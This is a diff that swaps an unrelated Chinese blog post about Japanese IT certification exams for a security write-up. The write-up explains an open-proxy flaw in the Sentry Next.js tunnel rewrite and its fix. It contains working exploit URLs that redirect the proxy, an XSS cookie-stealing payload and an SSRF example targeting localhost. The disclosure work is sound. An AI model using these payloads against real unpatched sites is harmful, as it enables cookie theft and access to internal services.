@@ -1,23 +1,103 @@
-而實際在考 SG 的時候，時間是比想像中夠用的，寫完大概剩個 20 分鐘左右，我檢查了 10 分鐘以後就交卷了。
+if (typeof originalRewrites !== 'function') {
+      return [injectedRewrite];
+    }
 
-至於 FE 的話是第二天考，考出來 A 科目是 715 分，B 科目是 905，沒想到裸考的成績比我想像中的還高。
+    // @ts-expect-error Expected 0 arguments but got 1 - this is from the future-proofing mentioned above, so we don't care about it
+    const originalRewritesResult = await originalRewrites(...args);
 
-A 科目時間很緊，我寫完以後幾乎沒什麼時間可以檢查，大概剩個五分鐘左右而已，我覺得只要你以前計算機概論教的東西沒有全部忘光，就滿有勝算的。另外就是 A 科目也會考一些資安的東西，跟 SG 重疊，因此資安的部分有幫我加一些分數，看來兩個考試一起考還是有點優勢的。
+    if (Array.isArray(originalRewritesResult)) {
+      return [injectedRewrite, ...originalRewritesResult];
+    } else {
+      return {
+        ...originalRewritesResult,
+        beforeFiles: [injectedRewrite, ...(originalRewritesResult.beforeFiles || [])],
+      };
+    }
+  };
+}
+```
 
-反倒是 B 科目比想像中簡單不少，我做完之後還有時間全部驗算一遍，考的當下就知道分數一定不會太差。
+其中的重中之重就是這一段：
 
-最後總結一下，我認為我的考試策略是有效的，確實可以在完全看不懂日文平假名的狀況下，靠著片假名跟漢字去猜出題目跟選項的意思。當然，這並不是說 100% 的題目都這樣，但只要 80% 的題目可以透過這樣讀懂，你再掌握其中的 80%，你就能拿到 64% 的分數，順利通過考試。我們的目標是通過考試，不是學會日文，也不是拿滿分。
+``` js
+const injectedRewrite = {
+  // Matched rewrite routes will look like the following: `[tunnelPath]?o=[orgid]&p=[projectid]`
+  // Nextjs will automatically convert `source` into a regex for us
+  source: `${tunnelPath}(/?)`,
+  has: [
+    {
+      type: 'query',
+      key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers
+      value: '(?<orgid>.*)',
+    },
+    {
+      type: 'query',
+      key: 'p', // short for projectId - we keep it short so matching is harder for ad-blockers
+      value: '(?<projectid>.*)',
+    },
+  ],
+  destination: 'https://o:orgid.ingest.sentry.io/api/:projectid/envelope/?hsts=0',
+};
+```
 
-不過有一個變因是我不確定題目難度是否會變動，也搞不好我能考出這樣的成績是因為我幸運點比較高，所以題目比較簡單。而且我考的時間點是新制度剛上線，也說不定主辦單位還在調整難度，未來可能會變得更難。
+會根據 query string 中的 `o` 跟 `p`，決定最後要重新導向的 URL。
 
-然後那兩個考古題網站有留言板讓大家交換考試心得，可以看到其他背景的人怎麼唸書怎麼複習，以及最後考出來的分數是多少：
+而這邊的問題是這兩個參數的 regexp 都用了 `.*`，也就是說會配對到任何字元，換句話說，底下這個網址：
 
-1. SG https://www.sg-siken.com/bbs/1487.html
-2. FE https://www.fe-siken.com/bbs/4784.html
+```
+https://huli.tw/tunnel?o=abc&p=def
+```
 
-總結來說，我覺得如果你未來有想要到日本當工程師但是資格不符，或者是高度人才分數不夠，又跟我一樣不會日文的話，可以試試看我的考試策略，嘗試考個 SG 或是 FE，是我覺得還不錯的投資。
+會 proxy 到：
 
-參考資料：
+```
+https://oabc.ingest.sentry.io/api/def/envelope/?hsts=0
+```
 
-1. [日本软考之基本情报技术者](https://blog.gimo.me/posts/fundamental-information-technology-engineer-examination/)
-2. [这可能是最详细的【情報処理技術者試験】解说文章（附复习网站）](https://zhuanlan.zhihu.com/p/354557310)
+看起來沒什麼問題，但如果是這樣呢？
+
+```
+https://huli.tw/tunnel?o=example.com%23&p=def
+```
+
+`%23` 是 `#` URL encode 後的結果，最後就會 proxy 到：
+
+```
+https://oexample.com#.ingest.sentry.io/api/def/envelope/?hsts=0
+```
+
+我們利用了 `#` 來把原本的 hostname 都當成 hash 的一部分，並且成功更改了 proxy 的目的地。但最前面那個 o 還是有點煩人，不如把它一起消除掉吧！只要在最前面加個 `@` 就行了：
+
+```
+https://huli.tw/tunnel?o=@example.com%23&p=def
+```
+
+會變成：
+
+```
+https://o@example.com#.ingest.sentry.io/api/def/envelope/?hsts=0
+```
+
+如此一來，攻擊者就可以利用 o 這個參數更改 proxy 的目的地，將 request 導向至任何地方。剛剛有說過這個 rewrite 功能會將 response 直接回傳，所以當使用者瀏覽：`https://huli.tw/tunnel?o=@example.com%23&p=def` 的時候，看到的 response 會是 `example.com` 的結果。
+
+也就是說，如果攻擊者把請求導向至自己的網站，就可以輸出 `<script>alert(document.cookie)</script>`，就變成了一個 XSS 漏洞。
+
+若是攻擊者不是導到自己的網站，而是導向到其他內部的網頁如 `https://localhost:3001` 之類的，就是一個 SSRF 的漏洞（但目標必須支援 HTTPS 就是了）。
+
+至於修復方式的話也很簡單，只要對 regexp 做出一些限制即可，最後 Sentry 是調整成[只允許數字](https://github.com/getsentry/sentry-javascript/pull/9416/files)：
+
+``` js
+{
+  type: 'query',
+  key: 'o', // short for orgId - we keep it short so matching is harder for ad-blockers
+  value: '(?<orgid>\\d*)',
+},
+```
+
+7.77.0 版本以及之後的版本都已經修復了這個問題。
+
+## 總結
+
+這個漏洞真的滿簡單而且滿好重現的，只需要找到修復的 commit，看兩眼程式碼大概就能知道怎麼攻擊。
+
+總之呢，在做 URL rewrite 的時候真的必須謹慎一點，不然還滿容易出問題的（尤其是你不只是 rewrite path，而是 rewrite 整個 URL）。
